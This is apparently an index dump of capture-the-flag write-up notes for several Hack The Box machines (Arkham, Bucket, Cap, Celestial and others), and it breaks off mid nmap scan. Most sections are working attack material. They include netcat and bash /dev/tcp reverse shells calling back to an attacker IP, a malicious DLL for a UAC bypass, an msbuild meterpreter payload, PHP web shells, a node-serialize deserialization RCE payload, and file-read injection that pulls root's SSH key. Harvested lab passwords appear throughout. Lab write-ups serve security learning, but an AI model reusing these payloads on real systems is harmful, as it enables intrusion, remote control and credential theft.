"HTB/Machines/Arkham/#user-alfred", "title": "User Alfred", "text": "<p>Found a <code>backup.zip</code> file in <code>c:\\Users\\Alfred\\Downloads\\backups</code></p> <pre><code>&gt; powershell Get-ChildItem -Path C:\\ -Include appserver.zip -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>filetransfer.py</p> <pre><code>from flask import Flask, request \napp = Flask(__name__) \n@app.route('/upload', methods=['POST']) \ndef upload_file(): \n    if 'file' not in request.files: \n        return 'No file part' \n    file = request.files['file'] \n    if file.filename == '': \n        return 'No selected file' \n    file.save(file.filename) \n    return 'File uploaded successfully'\nif __name__ == '__main__': \n    app.run(host='0.0.0.0', port=8081)\n</code></pre> <pre><code>&gt; curl -F \"file=@backup.zip\" http://10.10.16.2:8081/upload \n</code></pre> <p>OR, use smbserver to transmit files</p> <pre><code># Kali\n$ smbserver.py -smb2support -username df -password df share .\n\n# Target\n&gt; net use \\\\10.10.16.2\\share /u:df df\n&gt;copy backup.zip \\\\10.10.16.2\\share\\\n</code></pre> <p>There is <code>alfred@arkham.local.ost</code> inside the <code>backup.zip</code>. It a <code>Microsoft Outlook Offline Storage</code> file.</p> <p></p> <p><code>readpst</code> is a tool to parse .pst and .ost files from Linux. This creates <code>Drafts.mbox</code> file:</p> <pre><code># in python virtual environment\n$ sudo apt install pst-utils\n$ readpst  alfred@arkham.local.ost \nOpening PST file and indexes...\nProcessing Folder \"Deleted Items\"\nProcessing Folder \"Inbox\"\nProcessing Folder \"Outbox\"\nProcessing Folder \"Sent Items\"\nProcessing Folder \"Calendar\"\nProcessing Folder \"Contacts\"\nProcessing Folder \"Conversation Action Settings\"\nProcessing Folder \"Drafts\"\n    \"Inbox\" - 0 items done, 7 items skipped.\n    \"Calendar\" - 0 items done, 3 items skipped.\nProcessing Folder \"Journal\"\nProcessing Folder \"Junk E-Mail\"\nProcessing Folder \"Notes\"\nProcessing Folder \"Tasks\"\nProcessing Folder \"Sync Issues\"\nProcessing Folder \"RSS Feeds\"\nProcessing Folder \"Quick Step Settings\"\n    \"alfred@arkham.local.ost\" - 15 items done, 0 items skipped.\nProcessing Folder \"Conflicts\"\nProcessing Folder \"Local Failures\"\nProcessing Folder \"Server Failures\"\n    \"Sync Issues\" - 3 items done, 0 items skipped.\n    \"Drafts\" - 1 items done, 0 items skipped.\n</code></pre> <p><code>.mbox</code> is a email mailbox file format that stores multiple messages in a single file, and does it as text. I can use less to view it, or open it in <code>mutt</code>, a Linux command line mail client.</p> <p>I\u2019ll use <code>mutt -R -f Drafts.mbox</code> , where <code>-R</code> says to open as read only, and <code>-f</code> says to open a file. There may be a question about creating a root mailbox (either way is fine, I\u2019ll pick no). I also don\u2019t need to remove a lock count. Then I get the mainbox:</p> <p></p> <p>image001.png </p> <p><code>batman:Zx^#QZX+T!123</code></p>"}, {"location": "HTB/Machines/Arkham/#user-batman", "title": "User batman", "text": "<pre><code>&gt;powershell\n\n&gt; $username = \"arkham\\batman\"\n&gt; $password = \"Zx^#QZX+T!123\"\n&gt; $secstr = New-Object -TypeName System.Security.SecureString\n&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}\n&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr\n\n&gt; iwr -uri http://10.10.16.2/nc.exe -Outfile nc.exe\n\n&gt; Invoke-Command -Computer arkham -ScriptBlock {cmd /c C:\\Users\\Alfred\\nc.exe -e cmd 10.10.16.2 4444} -Credential $cred\n\n&gt; enter-pssession 1\n</code></pre> <p>Batman is in the administrators group but doesn't have full administrative privilege. </p>"}, {"location": "HTB/Machines/Arkham/#uac-bypass", "title": "UAC bypass", "text": "<p>UAC-Bypass \u2013 Windows Privilege Escalation</p> <pre><code># search files\n\n&gt; gci recurse . | select fullname\n</code></pre> <ol> <li>mount and copy <code>C:\\</code> to a new drive <code>Z:\\</code></li> </ol> <p>Unintended way, it may not work on other situations.</p> <pre><code>&gt; net use Z: \\\\127.0.0.1\\C$\n&gt; z:\n</code></pre> <p></p> <ol> <li>DLL hijacking</li> </ol> <p>SystemPropertiesAdvanced.exe DLL Hijacking UAC Bypass</p> <pre><code>&gt; findstr /C:\"&lt;autoElevate&gt;true\" C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe\n</code></pre> <p></p> <p>The shell is constrained. So, firstly, I need to get an interactive shell.</p> <ol> <li>create an interactive session via GreatSCT</li> </ol> <pre><code>$ python -m venv .venv    \n$ source ./.venv/bin/activate\n$ git clone https://github.com/GreatSCT/GreatSCT.git \n$ cd GreatSCT/setup\n$ sudo ./setup.sh -c \n$ ./GreatSCT.py\n$ list &gt; use 1 &gt; list &gt; use 9 (msbuild/meterpreter/rev_tcp.py\n)\n$ set lhost 10.10.16.2\n$ set lport 8001\n$ generate\n</code></pre> <p></p> <pre><code>$ msfconsole -r /usr/share/greatsct-output/handlers/payload1.rc\n\n&gt; iwr -uri http://10.10.16.2/payload1.xml -Outfile payload.xml\n&gt; c:\\windows\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe payload.xml\n\n$ sessions -i 1\n$ ps -S explorer.exe\n# need to migrate explorer.exe session\n$ migrate 5044\n</code></pre> <p></p> <ol> <li>DLL hijacking</li> </ol> <p>main.c</p> <pre><code>#include &lt;windows.h&gt;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)\n{\n    switch(dwReason)\n    {\n        case DLL_PROCESS_ATTACH:\n            WinExec(\"c:\\\\users\\\\batman\\\\nc.exe 10.10.16.2 9001 -e cmd\", 0);\n            break;\n        case DLL_PROCESS_DETACH:\n            break;\n        case DLL_THREAD_ATTACH:\n            break;\n        case DLL_THREAD_DETACH:\n            break;\n    }\n}\n</code></pre> <pre><code>$ i686-w64-mingw32-gcc main.c -lws2_32 -o srrstr.dll -shared\n</code></pre> <pre><code>&gt; iwr -uri http://10.10.16.2/nc.exe -Outfile c:\\users\\batman\\nc.exe\n&gt; iwr -uri http://10.10.16.2/srrstr.dll -Outfile srrstr.dll\n\n# the full path is c:\\users\\batman\\appdata\\local\\microsoft\\windowsapps\\\n&gt; move srrstr.dll appdata\\local\\microsoft\\windowsapps\\\n\n# use to check if the DLL works correctly when something goes wrong\n&gt; rundll32 srrstr.dll,asd\n\n# will get a reverse shell as Batman with full privilege\n&gt; cmd /c c:\\windows\\SysWow64\\SystemPropertiesAdvanced.exe\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Bucket/", "title": "Bucket", "text": "<p>AWS CLI Command Reference</p> <p>AWS DynamoDB Command Documentation</p> <pre><code>\u2514\u2500$ sudo nmap 10.10.10.212 -p- --min-rate=10000 -T4 -sCV  \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://bucket.htb/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\u2514\u2500$ echo \"10.10.10.212 bucket.htb\" | sudo tee -a /etc/hosts \n</code></pre> <p>http://bucket.htb/ </p>"}, {"location": "HTB/Machines/Bucket/#view-source-code", "title": "View source code", "text": "<pre><code>&lt;article&gt;\n&lt;div class=\"coffee\"&gt;\n&lt;img src=\"http://s3.bucket.htb/adserver/images/bug.jpg\" alt=\"Bug\" height=\"160\" width=\"160\"&gt;\n&lt;/div&gt;\n&lt;div class=\"description\"&gt;\n&lt;h3&gt;Bug Bounty and 0day Research&lt;/h3&gt;\n&lt;span&gt;march 17, 2020 | Security&lt;/span&gt;\n&lt;p&gt;Customised bug bounty and new 0day feeds. Feeds can be used on TV, mobile, desktop and web applications. Collecting security feeds from 100+ different trusted sources around the world.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/article&gt;\n&lt;div class=\"articles\"&gt;\n\n&lt;article&gt;\n&lt;div class=\"coffee\"&gt;\n&lt;img src=\"http://s3.bucket.htb/adserver/images/malware.png\" alt=\"Malware\" height=\"160\" width=\"160\"&gt;\n&lt;/div&gt;\n&lt;div class=\"description\"&gt;\n&lt;h3&gt;Ransomware Alerts&lt;/h3&gt;\n&lt;span&gt;march 17, 2020 | Malware&lt;/span&gt;\n&lt;p&gt;Run awareness ad campaigns on Ransomwares and other newly found malwares. Choose different types of malwares to fit for your campaign&lt;/p&gt;\n&lt;/div&gt;\n&lt;/article&gt;\n\n&lt;article&gt;\n&lt;div class=\"coffee\"&gt;\n&lt;img src=\"http://s3.bucket.htb/adserver/images/cloud.png\" alt=\"cheer\" height=\"160\" width=\"160\"&gt;\n&lt;/div&gt;\n&lt;div class=\"description\"&gt;\n&lt;h3&gt;Cloud Updates&lt;/h3&gt;\n&lt;span&gt;march 17, 2020 | Cloud&lt;/span&gt;\n&lt;p&gt;Stay tuned to cloud technology updates. A superior alternative to Push Notifications and SMS A2P alerts. &lt;/p&gt;\n&lt;/div&gt;\n&lt;/article&gt;\n\n\u2514\u2500$ echo \"10.10.10.212 s3.bucket.htb\" | sudo tee -a /etc/hosts \n</code></pre> <p>Then, refresh the website, you will see images. </p> <p>email: support@bucket.htb</p> <pre><code>\u2514\u2500$ wfuzz -c -u http://bucket.htb/ -H \"Host: FUZZ.bucket.htb\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 9\n</code></pre> <p></p> <pre><code>\u2514\u2500$ curl -v http://s3.bucket.htb/\n*   Trying 10.10.10.212:80...\n* Connected to s3.bucket.htb (10.10.10.212) port 80\n&gt; GET / HTTP/1.1\n&gt; Host: s3.bucket.htb\n&gt; User-Agent: curl/8.4.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 404 \n&lt; Date: Thu, 22 Feb 2024 01:15:14 GMT\n&lt; Server: hypercorn-h11\n&lt; content-type: text/html; charset=utf-8\n&lt; content-length: 21\n&lt; access-control-allow-origin: *\n&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH\n&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging\n&lt; access-control-expose-headers: x-amz-version-id\n&lt; \n* Connection #0 to host s3.bucket.htb left intact\n\n{\"status\": \"running\"}  \n\n# Test PUT (upload)\ncurl -X PUT --data-binary \"test\" http://s3.bucket.htb/adserver/test.txt\n\necho '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php\n\n# successfullly upload to the bucket, but cannot be executed\ncurl -X PUT -H \"Content-Type: application/x-httpd-php\" --data-binary \"&lt;?php exec(\\\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.103/4444 0&gt;&amp;1'\\\"); ?&gt;\" http://s3.bucket.htb/adserver/shell.php\n\ncurl -X PUT --data-binary \"AddType application/x-httpd-php .php\" http://s3.bucket.htb/adserver/.htaccess\n</code></pre> <pre><code>sudo apt install awscli\n\n# list bucket\naws --endpoint-url=http://s3.bucket.htb s3 ls\n\nUnable to locate credentials. You can configure credentials by running \"aws configure\".\n\n# configure the keys by using a random credential\naws configure \n\nAWS Access Key ID [None]: test\nAWS Secret Access Key [None]: test\nDefault region name [None]: us-east-1\nDefault output format [None]: \n\naws --endpoint-url=http://s3.bucket.htb s3 ls\n2025-04-24 07:46:03 adserver\n\n# list content in s3 bucket\naws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver\n                           PRE images/\n2025-04-24 07:46:04       5344 index.html\n\naws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver\nupload: ./shell.php to s3://adserver/shell.php\n</code></pre> <p>http://bucket.htb/shell.php?cmd=id</p> <p></p> <p>If you use s3 bucket link to access the shell.php file, it will download the file instead of execute it.</p> <p>http://s3.bucket.htb/shell.php?cmd=id</p> <p>The uploaded files will be deleted in minutes.</p> <pre><code>echo \"&lt;?php exec('/bin/bash -c \\\"bash -i &gt;&amp; /dev/tcp/10.10.15.103/4444 0&gt;&amp;1 \\\"'); ?&gt;\" &gt; shell.php\n\naws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver\nupload: ./shell.php to s3://adserver/shell.php\n</code></pre> <p></p> <pre><code># to obtain though a stable and interactive shell.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\");'\nCRTL + Z\nstty raw -echo\n</code></pre> <pre><code>/home/roy/project$ cat db.php\ncat db.php\n&lt;?php\nrequire 'vendor/autoload.php';\ndate_default_timezone_set('America/New_York');\nuse Aws\\DynamoDb\\DynamoDbClient;\nuse Aws\\DynamoDb\\Exception\\DynamoDbException;\n\n$client = new Aws\\Sdk([\n    'profile' =&gt; 'default',\n    'region'  =&gt; 'us-east-1',\n    'version' =&gt; 'latest',\n    'endpoint' =&gt; 'http://localhost:4566'\n]);\n\n$dynamodb = $client-&gt;createDynamoDb();\n\n//todo\n\n$ aws configure\naws configure\nAWS Access Key ID [None]: test\nAWS Secret Access Key [None]: test\nDefault region name [None]: us-east-1\nDefault output format [None]: \n\n[Errno 13] Permission denied: '/var/www/.aws'\n\n$ mkdir /tmp/f\n$ export HOME=/tmp/f\n\n$ aws configure\naws configure\nAWS Access Key ID [None]: test\nAWS Secret Access Key [None]: test\nDefault region name [None]: us-east-1\nDefault output format [None]: \n\n# List all tables from bynamodb\n$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables\n\n{\n    \"TableNames\": [\n        \"users\"\n    ]\n}\n\n$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users\n\n{\n    \"Items\": [\n        {\n            \"password\": {\n                \"S\": \"Management@#1@#\"\n            },\n            \"username\": {\n                \"S\": \"Mgmt\"\n            }\n        },\n        {\n            \"password\": {\n                \"S\": \"Welcome123!\"\n            },\n            \"username\": {\n                \"S\": \"Cloudadm\"\n            }\n        },\n        {\n            \"password\": {\n                \"S\": \"n2vM-&lt;_K_Q:.Aa2\"\n            },\n            \"username\": {\n                \"S\": \"Sysadm\"\n            }\n        }\n    ],\n    \"Count\": 3,\n    \"ScannedCount\": 3,\n    \"ConsumedCapacity\": null\n}\n</code></pre>"}, {"location": "HTB/Machines/Bucket/#roy", "title": "Roy", "text": "<p><code>roy:n2vM-&lt;_K_Q:.Aa2</code></p> <pre><code>$ netstat -tunl\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:34821         0.0.0.0:*               LISTEN     \ntcp6       0      0 :::80                   :::*                    LISTEN     \ntcp6       0      0 :::22                   :::*                    LISTEN     \nudp        0      0 127.0.0.53:53           0.0.0.0:* \n</code></pre> <pre><code>roy@bucket:/var/www/bucket-app$ cat index.php\n&lt;?php\nrequire 'vendor/autoload.php';\nuse Aws\\DynamoDb\\DynamoDbClient;\nif($_SERVER[\"REQUEST_METHOD\"]===\"POST\") {\n        if($_POST[\"action\"]===\"get_alerts\") {\n                date_default_timezone_set('America/New_York');\n                $client = new DynamoDbClient([\n                        'profile' =&gt; 'default',\n                        'region'  =&gt; 'us-east-1',\n                        'version' =&gt; 'latest',\n                        'endpoint' =&gt; 'http://localhost:4566'\n                ]);\n\n                $iterator = $client-&gt;getIterator('Scan', array(\n                        'TableName' =&gt; 'alerts',\n                        'FilterExpression' =&gt; \"title = :title\",\n                        'ExpressionAttributeValues' =&gt; array(\":title\"=&gt;array(\"S\"=&gt;\"Ransomware\")),\n                ));\n                foreach ($iterator as $item) {\n                        $name=rand(1,10000).'.html';\n                        file_put_contents('files/'.$name,$item[\"data\"]);\n                }\n                passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\");\n        }\n}\nelse\n{\n?&gt;\n</code></pre> <p>The above code connects to <code>DynamoDB</code> service and performs a scan of the <code>alerts</code> table. It then filters the content based on title. If there's a key that contains <code>Ransomware</code> title then it writes its data value to a random <code>html</code> file inside files folder. Using the <code>PD4ML</code> utility it converts the HTML contents to a PDF file. By checking the list of tables, we observe that there's no <code>alerts</code> table present in the <code>DynamoDB</code> database.</p> <pre><code>$ ssh -L 8000:127.0.0.1:8000 roy@bucket.htb\n</code></pre> <p></p> <p></p> <p><code>pd4ml_demo.jar</code> is used to create PDFs by the site on port 8000.</p> <pre><code># create alerts table, the table will be automatically deleted in minutes\n\naws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5\n</code></pre> <p></p> <pre><code>aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;html&gt;&lt;h1&gt;test&lt;/h1&gt;&lt;/html&gt;\"}}'\n\n{\n    \"ConsumedCapacity\": {\n        \"TableName\": \"alerts\",\n        \"CapacityUnits\": 1.0\n    }\n}\n\n# on Kali\ncurl http://localhost:8000/index.php -d 'action=get_alerts'\n</code></pre> <p></p> <p></p> <p>We see that the PDF is indeed created with HTML that we provided in the database. Checking the supported HTML tags for pd4ml reveals that we can also embed an external resource as PDF attachment using the <code>attachment</code> tag.</p> <p>This feature seems like no longer exists in the latest version.</p> <pre><code>&lt;pd4ml:attachment src=\"http://pd4ml.com/i/logo.png\" description=\"test\"\nicon=\"Paperclip\"/&gt;\n\n&lt;html&gt;&lt;pd4ml:attachment src=\"file:///etc/passwd\" description=\"test\"\nicon=\"Paperclip\"/&gt;&lt;/html&gt;\n</code></pre> <pre><code>aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;html&gt;&lt;pd4ml:attachment src=\\\"file:///etc/passwd\\\" description=\\\"test\\\" icon=\\\"Paperclip\\\"/&gt;&lt;/html&gt;\"}}'\n\naws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;html&gt;&lt;pd4ml:attachment src='\\''file:///etc/passwd'\\'' description='\\''test'\\'' icon='\\''Paperclip'\\''/&gt;&lt;/html&gt;\"}}'\n</code></pre> <p></p> <pre><code>aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;html&gt;&lt;pd4ml:attachment src='\\''file:///root/'\\'' description='\\''test'\\'' icon='\\''Paperclip'\\''/&gt;&lt;/html&gt;\"}}'\n\naws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;html&gt;&lt;pd4ml:attachment src='\\''file:///root/.ssh/id_rsa'\\'' description='\\''test'\\'' icon='\\''Paperclip'\\''/&gt;&lt;/html&gt;\"}}'\n</code></pre> <pre><code>chmod 600 id_rsa\nssh -i id_rsa root@bucket.htb\n</code></pre>"}, {"location": "HTB/Machines/Cap/", "title": "Cap", "text": ""}, {"location": "HTB/Machines/Cap/#port-scan", "title": "Port Scan", "text": "<pre><code>$ sudo nmap 10.10.10.245 -p- --min-rate=10000 -T4 -sCV\n[sudo] password for kali: \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 05:52 UTC\nWarning: 10.10.10.245 giving up on port because retransmission cap hit (6).\nNmap scan report for 10.10.10.245\nHost is up (0.31s latency).\nNot shown: 44899 closed tcp ports (reset), 20633 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)\n|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)\n|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)\n80/tcp open  http    gunicorn\n|_http-title: Security Dashboard\n|_http-server-header: gunicorn\n</code></pre>"}, {"location": "HTB/Machines/Cap/#web-app", "title": "Web APP", "text": "<pre><code>$ gobuster dir -u http://10.10.10.245/ -w /usr/share/wordlists/dirb/common.txt \n/data                 (Status: 302) [Size: 208] [--&gt; http://10.10.10.245/]\n/ip                   (Status: 200) [Size: 17457]\n/netstat              (Status: 200) [Size: 28836]\n</code></pre> <pre><code>$ for i in {0..10} ; do wget 10.10.10.245/download/${i} -O pcaps/${i}.pcap 2&gt;/dev/null || break; done; rm pcaps/${i}.pcap\n</code></pre> <p>in <code>0.pcap</code></p> <p></p> <p>nathan:Buck3tH4TF0RM3!</p>"}, {"location": "HTB/Machines/Cap/#to-root", "title": "To root", "text": "<p>One way to give a program some privileges without having it completely get the power of root is to use Linux capabilities. Python has been assigned two:</p> <pre><code>$ getcap /usr/bin/python3.8\n\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n\n$ python3\n&gt;&gt;&gt; import pty\n&gt;&gt;&gt; import os\n&gt;&gt;&gt; os.setuid(0)\n&gt;&gt;&gt; pty.spawn(\"bash\")\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Celestial/", "title": "Celestial", "text": ""}, {"location": "HTB/Machines/Celestial/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.10.85 -p- --min-rate=10000 -T4 -sCV\n\nPORT     STATE SERVICE VERSION\n3000/tcp open  http    Node.js Express framework\n|_http-title: Site doesn't have a title (text/html; charset=utf-8).\n</code></pre> <p>http://10.10.10.85:3000/</p> <p></p> <p>Base64 decode the cookie <code>profile</code></p> <pre><code>{\"username\":\"Dummy\",\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"}\n</code></pre>"}, {"location": "HTB/Machines/Celestial/#insecure-deserailization-in-nodejs", "title": "Insecure deserailization in Node.js", "text": "<p>Serialization is the process of converting an object into a stream of bytes to store the object or transmit it to memory, a database, or a file. Its main purpose is to save the state of an object in order to be able to recreate it when needed. The reverse process is called deserialization.</p> <p>Insecure Deserialization in Node.js</p> <p>serialize.js</p> <pre><code>var serialize = require('node-serialize');\n\nx = {\ntest : function(){\n  require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f\", function puts(error, stdout, stderr) {});\n}\n};\n\nconsole.log(\"Serialized: \\n\" + serialize.serialize(x));\n\n/*\nappend () after the function closing bracket\n*/\n</code></pre> <pre><code>$ python -m venv .venv\n$ source ./.venv/bin/active\n\n$ sudo apt-get update\n\n$ sudo apt install nodejs\n$ sudo apt install npm\n$ npm install node-serialize\n\n$ node serialize.js\n</code></pre> <pre><code>{\"test\":\"_$$ND_FUNC$$_function(){\\n  require('child_process').execSync(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.2 4444 &gt;/tmp/f\\\", function puts(error, stdout, stderr) {});\\n}\"}\n\n{\"username\":\"_$$ND_FUNC$$_function(){\\n  require('child_process').execSync(\\\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/4444 0&gt;&amp;1'\\\", function puts(error, stdout, stderr) {});\\n}()\",\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"}\n</code></pre> <p>Base64 endcode the data and replace the cookie attribute <code>profile</code></p> <p></p>"}, {"location": "HTB/Machines/Celestial/#user-sun", "title": "User sun", "text": "<pre><code>$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n$ find / -type f -writable 2&gt;/dev/null | grep -v '^(/proc|/sys|/snap|/boot|/var|/run|/dev|/opt|/etc|/usr/lib|/usr/s?bin|/usr/share/)'\n\n/home/sun/Documents/script.py\n</code></pre> <p>The <code>output.txt</code> is owned by root and its content are from <code>script.py</code> which we can modify it. So modify the script and put a python reverse shell inside.</p> <pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.2\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Cereal/", "title": "Cereal", "text": ""}, {"location": "HTB/Machines/Cereal/#port-scan", "title": "Port scan", "text": ""}, {"location": "HTB/Machines/Developer/", "title": "Developer", "text": ""}, {"location": "HTB/Machines/Developer/#port-scan", "title": "Port scan", "text": "<pre><code>$ echo \"10.10.11.103 developer.htb\" | sudo tee -a /etc/hosts \n\n$ sudo nmap 10.10.11.103 -p- --min-rate=10000 -T4 -sCV\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)\n|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)\n|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Developer: Free CTF Platform\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HTB/Machines/Developer/#web-app", "title": "Web APP", "text": "<pre><code>$ gobuster dir -u http://developer.htb -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>http://developer.htb/admin/login/?next=/admin/</p> <p></p>"}, {"location": "HTB/Machines/Escape/", "title": "Escape", "text": ""}, {"location": "HTB/Machines/Escape/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.11.202 -p- -T4 --min-rate=10000 -sCV\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-06 11:28:16Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-07-06T11:29:53+00:00; -16h00m07s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n|_ssl-date: 2024-07-06T11:29:54+00:00; -16h00m07s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info: \n|   10.10.11.202:1433: \n|     Target_Name: sequel\n|     NetBIOS_Domain_Name: sequel\n|     NetBIOS_Computer_Name: DC\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: dc.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-07-06T11:19:35\n|_Not valid after:  2054-07-06T11:19:35\n|_ssl-date: 2024-07-06T11:29:53+00:00; -16h00m07s from scanner time.\n| ms-sql-info: \n|   10.10.11.202:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n|_ssl-date: 2024-07-06T11:29:53+00:00; -16h00m07s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-07-06T11:29:54+00:00; -16h00m07s from scanner time.\n| ssl-cert: Subject: \n| 